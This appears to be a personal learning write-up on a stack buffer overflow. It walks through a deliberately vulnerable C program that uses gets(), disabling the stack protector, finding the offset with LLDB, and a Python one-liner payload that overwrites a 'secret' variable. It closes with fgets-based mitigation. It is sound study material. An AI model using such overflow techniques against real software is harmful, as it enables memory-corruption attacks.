# Buffer overflow

## overwrite memory region

### vulnerable program

`vulnerable.c` defines a `secret` str variable, then reads into a char buffer using `gets`. The goal is craft an input that writes over the buffer boundaries and delivers a specific value into the memory address that holds `secret`.

### compilation

Tested using `GCC 14` with `-fno-stack-protector` on an M3 mac.

The flag is vital, without that I didn't manage to write into the address for `secret`. It is interesting to note that no matter how I compiled it, I always got a warning about `gets()` being deprecated and to use `fgets()` instead for security. Running the example always produced a warning about `gets()` being unsafe.

### crafting the input

#### the offset part
Since I am doing this on an M3 (ARM64) mac, I'm stuck with LLDB instead of GDB, so to follow the general approach from [this tutorial](https://ad2001.gitbook.io/a-noobs-guide-to-arm-exploitation/stack-based-buffer-overflows-on-arm64) I had to use [this GDB -> LLDB mapping guide](https://lldb.llvm.org/use/map.html#launch-a-process-with-arguments-args).

Then it's still possible to use the pattern generator to find the offset. Or more simply just 

```zsh
lldb vulnerable
(lldb) b vulnerable.c:14
(lldb) process launch
Process ... launched: ...
warning: this program uses gets(), which is unsafe.
Enter your name to see if you deserve an easter egg: A
(lldb) memory read -fx -c64 `$sp`
```

then look for `0xdeadbeef` and start entering `A`s on the input prompt until they start overwriting it. Which never seems to happen without `-fno-stack-protector` btw.

This takes care of the offset part of the special input

#### the payload part
Note: iTerm2 filters the control character that represents 0x13. The default terminal in OSX 14.4.1 asks to confirm but then does print it. Make sure the terminal will deliver the payload.

The example is taken from [the ctf handbook](https://ctf101.org/binary-exploitation/buffer-overflow/). That gives a starting point for the payload, although there is an error in there at the time of writing. It should say '\x37\x13\x00\x00'.

It would have been nice to be able to paste the bytes into CyberChef and copy paste the input into an `lldb` session. Even though `Terminal` allows pasting control characters, not all of them seem to work though. The best I got was.

```zsh
(lldb) memory read -fx -c64 `$sp`
0x16fdfe840: 0x00003e98 0x00000001 0x6fdfe950 0x00000001
0x16fdfe850: 0x6fdfeaa0 0x00000001 0x946520e0 0x00000001
0x16fdfe860: 0x6fdfeac8 0x00000001 0x00411b90 0x00000001
0x16fdfe870: 0x41414141 0x41414141 0x41414141 0xdead0037
0x16fdfe880: 0x00000000 0x00000000 0x00000000 0x0x000000
...
```

Here, `-fx` means "in hex format", `-c<N>` means "read N many memory chunks", `-s<N>` would mean read chunks of size N (bytes?), the default of 4 works well for the data in this example.

However, the python approach in the handbook works out of the box with python 3.12, even the offset was the same for me (4 additional 'A's to reach the secret, on top of the buffer length of 8 chars):

```zsh
❯ ./vulnerable <<<$(python -c "print('A'*12 + '\x37\x13\x00\x00')")

warning: this program uses gets(), which is unsafe.
Enter your name to see if you deserve an easter egg: Here, have an easter egg!
```

Funnily enough the number of trailing '\x00's can be anywhere from 1-6 for me without changing the outcome.

### Mitigation

The compiler suggests to use `fgets` instead. See `invulnerable.c` for an example.

cppreference.com also suggests `gets_s`, which seems to be defined in an optional part of the C11 standard and not adopted by GCC.

The same seems to apply to other functions which make C programs vulnerable to buffer overflows. There is a bounds checking alternative which should be used instead.
